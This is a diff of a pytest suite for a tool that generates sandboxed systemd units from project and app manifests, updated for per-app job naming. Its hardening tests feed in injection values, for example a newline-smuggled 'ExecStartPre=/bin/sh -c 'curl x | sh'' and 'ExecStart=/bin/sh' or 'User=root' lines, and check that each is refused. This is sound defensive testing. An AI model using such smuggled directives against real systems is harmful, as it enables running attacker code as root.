@@ -26,7 +26,9 @@ import pytest
 
 from mes import paths, units
 from mes.errors import Refused
-from mes.manifest import UI, AppSpec, Job, Project, loads
+from mes.manifest import UI, Job, Project
+
+import projects as helpers
 
 GOLDEN = Path(__file__).parent / "golden" / "units"
 UPDATE = os.environ.get("MES_UPDATE_GOLDEN") == "1"
@@ -39,53 +41,58 @@ PROJECT_TOML = """
 name = "demo"
 title = "Demo"
 version = "0.1.0"
+apps = ["demo_app", "demo_tool"]
 
-[apps.demo]
-cli = "demo"
+[ui]
+refresh_after = ["demo-app.build"]
+"""
 
-[apps.tool]
-cli = "demo-tool"
+APP_TOML = """
+[app]
+name = "demo-app"
+command = "demo-app"
 
 [jobs.sync]
-run = "demo sync --days 3"
+run = "sync --days 3"
 schedule = "*-*-* 06:00:00"
 network = ["api.example.com", "auth.example.com"]
 memory = "512M"
 timeout = "20m"
 
 [jobs.build]
-run = "demo build '50% done' $HOME"
+run = "build '50% done' $HOME"
 after = "sync"
 writes = ["data"]
 
-[jobs.report]
-run = "tool report"
-after = "build"
-writes = []
-
 [jobs.hook]
-run = "demo sync --quick"
+run = "sync --quick"
 webhook = true
 writes = ["state"]
 
 [jobs.export]
-run = "demo export"
+run = "export"
 manual = true
+"""
 
-[ui]
-data = "demo.sqlite"
-tables = ["daily"]
-refresh_after = ["build"]
+TOOL_TOML = """
+[app]
+name = "demo-tool"
+command = "demo-tool"
+
+[jobs.report]
+run = "report"
+after = "demo-app.build"
+writes = []
 """
 
 EXPECTED_FILES = sorted([
     "mes-demo.gate-read.socket", "mes-demo.gate-read@.service",
     "mes-demo.gate-write.socket", "mes-demo.gate-write@.service",
     "mes-demo.gate-deploy.socket", "mes-demo.gate-deploy@.service",
-    "mes-demo.job.sync.service", "mes-demo.job.sync.timer", "mes-demo.net.sync.service",
-    "mes-demo.job.build.service", "mes-demo.job.report.service",
-    "mes-demo.job.hook.service", "mes-demo.job.hook.path",
-    "mes-demo.job.export.service",
+    "mes-demo.job.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer", "mes-demo.net.demo-app.sync.service",
+    "mes-demo.job.demo-app.build.service", "mes-demo.job.demo-tool.report.service",
+    "mes-demo.job.demo-app.hook.service", "mes-demo.job.demo-app.hook.path",
+    "mes-demo.job.demo-app.export.service",
     "mes-demo.ui-refresh.service",
     "mes-demo.webhook.socket", "mes-demo.webhook.service",
 ])
@@ -94,7 +101,7 @@ SANDBOX_KEYS = {line.split("=", 1)[0] for line in units.SANDBOX_LINES}
 DIRECTIVES = {
     "Unit": {"Description", "Requires", "After", "Before", "OnSuccess"},
     "Service": SANDBOX_KEYS | {
-        "Type", "User", "Group", "ExecStart", "ExecStopPost", "WorkingDirectory", "Environment", "Slice",
+        "Type", "User", "Group", "ExecStartPre", "ExecStart", "ExecStopPost", "WorkingDirectory", "Environment", "Slice",
         "MemoryMax", "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "StandardInput", "StandardOutput",
         "StandardError", "ReadWritePaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
         "IPAddressDeny",
@@ -107,8 +114,8 @@ DIRECTIVES = {
 
 
 @pytest.fixture(scope="module")
-def project():
-    return loads(PROJECT_TOML)
+def project(tmp_path_factory):
+    return helpers.load(tmp_path_factory.mktemp("demo"), PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})
 
 
 @pytest.fixture(scope="module")
@@ -210,7 +217,7 @@ def test_every_file_parses_into_known_directives_and_markers(files):
         assert text.startswith(units.HEADER + "\n"), name
         assert units.read_markers(text)[0] == "demo", name
         if ".job." in name or ".net." in name:
-            assert units.read_markers(text)[1] == name.split(".")[2], name
+            assert units.read_markers(text)[1] == ".".join(name.split(".")[2:4]), name
 
 
 # =========================================================================== hardening
@@ -254,21 +261,21 @@ def test_no_network_unless_declared(files, name):
 
 
 def test_job_with_hosts_reaches_only_what_the_helper_allows(files):
-    sync = files["mes-demo.job.sync.service"]
+    sync = files["mes-demo.job.demo-app.sync.service"]
     assert values(sync, "PrivateNetwork") == []
     assert one(sync, "RestrictAddressFamilies") == "AF_UNIX AF_INET AF_INET6"
     assert one(sync, "IPAddressDeny") == "any"
-    assert one(sync, "Requires") == "mes-demo.net.sync.service"
-    assert one(sync, "After") == "mes-demo.net.sync.service"
+    assert one(sync, "Requires") == "mes-demo.net.demo-app.sync.service"
+    assert one(sync, "After") == "mes-demo.net.demo-app.sync.service"
     assert "# network: only api.example.com, auth.example.com" in sync
 
-    net = files["mes-demo.net.sync.service"]
+    net = files["mes-demo.net.demo-app.sync.service"]
     assert values(net, "User") == []  # root: only root may change another unit's settings
     assert split_exec(one(net, "ExecStart")) == [
-        MES, "jobs", "allow-network", "--unit", "mes-demo.job.sync.service", "--",
+        MES, "jobs", "allow-network", "--unit", "mes-demo.job.demo-app.sync.service", "--",
         "api.example.com", "auth.example.com"]
     assert one(net, "CapabilityBoundingSet") == "CAP_SYS_ADMIN"
-    assert one(net, "Before") == "mes-demo.job.sync.service"
+    assert one(net, "Before") == "mes-demo.job.demo-app.sync.service"
     for line in ("NoNewPrivileges=yes", "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                  "SystemCallFilter=@system-service"):
         assert line in net.split("\n")
@@ -276,32 +283,40 @@ def test_job_with_hosts_reaches_only_what_the_helper_allows(files):
 
 
 def test_job_service_runs_the_app_and_records_as_root(files, layout):
-    sync = files["mes-demo.job.sync.service"]
+    sync = files["mes-demo.job.demo-app.sync.service"]
     assert one(sync, "Type") == "oneshot"
     assert split_exec(one(sync, "ExecStart")) == [
-        f"{layout.current_project}/.venv/bin/demo", "--json", "sync", "--days", "3"]
+        f"{layout.current_project}/.venv/bin/demo-app", "--json", "sync", "--days", "3"]
     post = one(sync, "ExecStopPost")
     assert post.startswith("+")
     # Root gets only names and the fixed server folder, never anything from the project's files.
-    assert split_exec(post) == [MES, "jobs", "record", "--project", "demo", "--server-root", ROOT, "sync"]
+    assert split_exec(post) == [MES, "jobs", "record", "--project", "demo", "--server-root", ROOT, "demo-app.sync"]
+    # A job that may write data first brings the shared database in line with project.toml.
+    assert split_exec(one(sync, "ExecStartPre")) == [MES, "db", "sync", "--quiet", "--project-dir",
+                                                     str(layout.current_project)]
+    assert f'"MES_PROJECT_DIR={layout.current_project}"' in values(sync, "Environment")
     assert one(sync, "MemoryMax") == "512M" and one(sync, "MemorySwapMax") == "0"
     assert one(sync, "TimeoutStartSec") == "1200"
     assert one(sync, "UMask") == "0077"
     assert one(sync, "WorkingDirectory") == str(layout.current_project)
-    assert '"MES_ALLOW=write"' in values(sync, "Environment") and '"MES_JOB=sync"' in values(sync, "Environment")
+    assert '"MES_ALLOW=write"' in values(sync, "Environment")
+    assert '"MES_JOB=demo-app.sync"' in values(sync, "Environment")
     assert one(sync, "ReadWritePaths") == f"{layout.data} {layout.store} {layout.state}"
     assert "[Install]" not in sync
-    report = files["mes-demo.job.report.service"]
+    report = files["mes-demo.job.demo-tool.report.service"]
     assert split_exec(one(report, "ExecStart"))[0] == f"{layout.current_project}/.venv/bin/demo-tool"
     assert values(report, "ReadWritePaths") == []  # writes = []
-    assert one(files["mes-demo.job.hook.service"], "ReadWritePaths") == str(layout.state)
+    assert values(report, "ExecStartPre") == []  # it may not write data, so no schema sync
+    hook = files["mes-demo.job.demo-app.hook.service"]
+    assert one(hook, "ReadWritePaths") == str(layout.state) and values(hook, "ExecStartPre") == []
 
 
 def test_after_chain_and_dashboard_refresh(files):
-    assert one(files["mes-demo.job.sync.service"], "OnSuccess") == "mes-demo.job.build.service"
-    assert one(files["mes-demo.job.build.service"], "OnSuccess") == \
-        "mes-demo.job.report.service mes-demo.ui-refresh.service"
-    assert values(files["mes-demo.job.report.service"], "OnSuccess") == []
+    assert one(files["mes-demo.job.demo-app.sync.service"], "OnSuccess") == "mes-demo.job.demo-app.build.service"
+    # A job of another app waits for build (after = "demo-app.build").
+    assert one(files["mes-demo.job.demo-app.build.service"], "OnSuccess") == \
+        "mes-demo.job.demo-tool.report.service mes-demo.ui-refresh.service"
+    assert values(files["mes-demo.job.demo-tool.report.service"], "OnSuccess") == []
     ui = files["mes-demo.ui-refresh.service"]
     assert split_exec(one(ui, "ExecStart")) == [
         EASY_UI, "--json", "--project-dir", f"{ROOT}/demo/code/current/project", "data", "build"]
@@ -313,23 +328,23 @@ def test_after_chain_and_dashboard_refresh(files):
 
 
 def test_quotes_percent_and_dollar_in_run_lines(files):
-    build = files["mes-demo.job.build.service"]
+    build = files["mes-demo.job.demo-app.build.service"]
     start = one(build, "ExecStart")
     assert '"50%% done" "$$HOME"' in start
     assert split_exec(start)[-2:] == ["50% done", "$HOME"]
 
 
 def test_timer_and_webhook_path(files, layout):
-    timer = files["mes-demo.job.sync.timer"]
+    timer = files["mes-demo.job.demo-app.sync.timer"]
     assert one(timer, "OnCalendar") == "*-*-* 06:00:00"
     assert one(timer, "Persistent") == "true"
     assert one(timer, "RandomizedDelaySec") == str(units.RANDOM_DELAY_SEC)
-    assert one(timer, "Unit") == "mes-demo.job.sync.service"
+    assert one(timer, "Unit") == "mes-demo.job.demo-app.sync.service"
     assert one(timer, "WantedBy") == "timers.target"
-    path = files["mes-demo.job.hook.path"]
-    assert one(path, "PathModified") == f"{layout.triggers}/hook"
-    assert one(path, "Unit") == "mes-demo.job.hook.service"
-    for name in ("mes-demo.job.export.service", "mes-demo.job.build.service"):
+    path = files["mes-demo.job.demo-app.hook.path"]
+    assert one(path, "PathModified") == f"{layout.triggers}/demo-app.hook"
+    assert one(path, "Unit") == "mes-demo.job.demo-app.hook.service"
+    for name in ("mes-demo.job.demo-app.export.service", "mes-demo.job.demo-app.build.service"):
         assert name.replace(".service", ".timer") not in files
 
 
@@ -369,25 +384,39 @@ def test_gate_instances(files, layout, level):
     assert one(files[f"mes-demo.gate-{level}.socket"], "MaxConnections") == ("1" if level == "deploy" else "4")
 
 
-def test_project_without_ui_or_webhook_has_no_such_units(layout):
-    p = loads('[project]\nname = "demo"\n[jobs.x]\nrun = "demo x"\nmanual = true\n')
+ONE_JOB = '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'
+
+
+def test_project_without_ui_or_webhook_has_no_such_units(layout, tmp_path):
+    p = helpers.load(tmp_path / "a", '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
     names = units.render_project(p, layout=layout, mes=MES, easy_ui=EASY_UI)
     assert not any("webhook" in n or "ui-refresh" in n or ".timer" in n for n in names)
-    assert "mes-demo.job.x.service" in names
+    assert "mes-demo.job.demo-x.x.service" in names
     # [ui] without refresh_after, or no easy-ui on the server: no refresh unit.
-    p2 = loads('[project]\nname = "demo"\n[ui]\ndata = "d.sqlite"\nrefresh_after = []\n')
+    p2 = helpers.load(tmp_path / "b", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = []\n',
+                      {"demo_x": ONE_JOB})
     assert "mes-demo.ui-refresh.service" not in units.render_project(p2, layout=layout, mes=MES, easy_ui=EASY_UI)
-    p3 = loads('[project]\nname = "demo"\n[jobs.x]\nrun = "demo x"\nmanual = true\n'
-               '[ui]\ndata = "d.sqlite"\nrefresh_after = ["x"]\n')
+    p3 = helpers.load(tmp_path / "c", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = ["demo-x.x"]\n',
+                      {"demo_x": ONE_JOB})
     assert "mes-demo.ui-refresh.service" not in units.render_project(p3, layout=layout, mes=MES)
 
 
-def test_two_projects_never_share_a_unit_name(layout):
-    a = loads('[project]\nname = "fit"\n[jobs.data-sync]\nrun = "fit x"\nmanual = true\n')
-    b = loads('[project]\nname = "fit-data"\n[jobs.sync]\nrun = "fit-data x"\nmanual = true\n')
+def test_two_projects_never_share_a_unit_name(layout, tmp_path):
+    a = helpers.load(tmp_path / "a", '[project]\nname = "fit"\napps = ["fit_data"]\n',
+                     {"fit_data": '[app]\nname = "fit-data"\ncommand = "fd"\n[jobs.sync]\nrun = "x"\nmanual = true\n'})
+    b = helpers.load(tmp_path / "b", '[project]\nname = "fit-data"\napps = ["fd_sync"]\n',
+                     {"fd_sync": '[app]\nname = "fd-sync"\ncommand = "fd"\n[jobs.x]\nrun = "x"\nmanual = true\n'})
     na = set(units.render_project(a, layout=paths.server_layout("fit", ROOT), mes=MES))
     nb = set(units.render_project(b, layout=paths.server_layout("fit-data", ROOT), mes=MES))
     assert not na & nb
+
+
+def test_old_unit_name_forms_are_not_job_units():
+    assert not units.JOB_UNIT_RE.fullmatch("mes-demo.job.sync.service")
+    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.job.sync.service")
+    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.net.sync.service")
+    m = units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
+    assert m and (m["project"], m["app"], m["job"]) == ("demo", "demo-app", "sync")
 
 
 # =========================================================================== escaping helpers
@@ -432,22 +461,24 @@ HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"
 
 
 def _job(**kw):
-    base = dict(name="x", run="demo ok", app="demo", argv=("ok",), trigger="manual")
+    base = dict(id="demo-app.x", name="x", run="ok", app="demo-app", argv=("ok",), trigger="manual")
     base.update(kw)
     return Job(**base)
 
 
 def _project(job=None, name="demo", apps=None, ui=None):
-    jobs = {job.name: job} if job is not None else {}
-    return Project(name=name, title="t", version="1", apps=apps or {"demo": AppSpec("demo", "demo")},
+    jobs = {job.id: job} if job is not None else {}
+    return Project(name=name, title="t", version="1", apps=apps or {"demo-app": helpers.spec("demo-app")},
                    jobs=jobs, ui=ui)
 
 
 @pytest.mark.parametrize("job", [
-    _job(name=HOSTILE),
-    _job(name="x\n[Service]"),
-    _job(name="X"),
-    _job(name="x.y"),
+    _job(id=HOSTILE),
+    _job(id="demo-app.x\n[Service]"),
+    _job(id="demo-app.X"),
+    _job(id="demo-app.x.y"),
+    _job(id="x"),
+    _job(id="demo-app.x\nExecStart=/bin/sh"),
     _job(argv=("ok", HOSTILE)),
     _job(argv=("ok", "a\rb")),
     _job(argv=("ok", ";")),
@@ -481,7 +512,7 @@ def test_hostile_project_name_refused(name, layout):
     with pytest.raises(Refused):
         units.render_project(_project(_job(), name=name), layout=layout, mes=MES)
     with pytest.raises(Refused):
-        units.job_unit(name, "x")
+        units.job_unit(name, "demo-app.x")
     with pytest.raises(Refused):
         units.gate_socket_path(name, "read")
 
@@ -489,7 +520,8 @@ def test_hostile_project_name_refused(name, layout):
 @pytest.mark.parametrize("cli", ["demo\nExecStart=/bin/sh", "../../bin/sh", "/bin/sh", "de mo"])
 def test_hostile_app_program_refused(cli, layout):
     with pytest.raises(Refused):
-        units.render_project(_project(_job(), apps={"demo": AppSpec("demo", cli)}), layout=layout, mes=MES)
+        units.render_project(_project(_job(), apps={"demo-app": helpers.spec("demo-app", cli)}), layout=layout,
+                             mes=MES)
 
 
 @pytest.mark.parametrize("root", ["/srv/my mes", "/srv/mes\nExecStart=/bin/sh", "relative", "/srv/../etc",
@@ -500,27 +532,30 @@ def test_hostile_server_root_refused(root):
         units.render_project(_project(_job()), layout=layout, mes=MES)
 
 
-def test_hostile_value_in_one_job_renders_nothing(layout):
-    p = loads('[project]\nname = "demo"\n[jobs.a]\nrun = "demo a"\nmanual = true\n')
-    bad = _job(name="b", argv=("ok", HOSTILE))
-    p = Project(name=p.name, title=p.title, version=p.version, apps=p.apps, jobs={**p.jobs, "b": bad})
+def test_hostile_value_in_one_job_renders_nothing(layout, tmp_path):
+    p = helpers.load(tmp_path, '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
+    bad = _job(id="demo-x.b", name="b", app="demo-x", argv=("ok", HOSTILE))
+    p = Project(name=p.name, title=p.title, version=p.version, apps=p.apps, jobs={**p.jobs, "demo-x.b": bad})
     with pytest.raises(Refused):
         units.render_project(p, layout=layout, mes=MES)
 
 
 def test_manifest_rejects_hostile_names_before_rendering():
     from mes.errors import MesError
+    from mes.manifest import loads, loads_app
 
     with pytest.raises(MesError):
-        loads('[project]\nname = "demo"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "demo ok"\nmanual = true\n')
+        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')
     with pytest.raises(MesError):
-        loads('[project]\nname = "demo\\nUser=root"\n')
+        loads('[project]\nname = "demo\\nUser=root"\napps = ["a_b"]\n')
     with pytest.raises(MesError):
-        loads('[project]\nname = "demo"\n[jobs.x]\nrun = "demo ok"\nmanual = true\nnetwork = ["a b"]\n')
+        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs.x]\nrun = "ok"\nmanual = true\nnetwork = ["a b"]\n')
+    with pytest.raises(MesError):
+        loads_app('[app]\nname = "demo-x"\ncommand = "x\\nExecStart=/bin/sh"\n')
 
 
 def test_ui_refresh_needs_safe_easy_ui(layout):
-    p = _project(_job(), ui=UI(data="d.sqlite", refresh_after=("x",)))
+    p = _project(_job(), ui=UI(refresh_after=("demo-app.x",)))
     with pytest.raises(Refused):
         units.render_ui_refresh(p, layout=layout, easy_ui="/tmp/easy-ui")
     text = units.render_ui_refresh(p, layout=layout, easy_ui=EASY_UI)
@@ -528,9 +563,10 @@ def test_ui_refresh_needs_safe_easy_ui(layout):
 
 
 def test_unit_name_patterns():
-    assert units.JOB_UNIT_RE.fullmatch("mes-demo.job.sync.service")
-    for bad in ("mes-demo.net.sync.service", "mes-demo.job.sync.timer", "mes-demo.job.sync.service\n",
-                "mes-Demo.job.sync.service", "mes-demo.job..service"):
+    assert units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
+    for bad in ("mes-demo.net.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer",
+                "mes-demo.job.demo-app.sync.service\n", "mes-Demo.job.demo-app.sync.service",
+                "mes-demo.job..service", "mes-demo.job.sync.service", "mes-demo.job.a.b.c.service"):
         assert not units.JOB_UNIT_RE.fullmatch(bad)
     with pytest.raises(ValueError):
         units.job_unit("demo", "x", "socket")
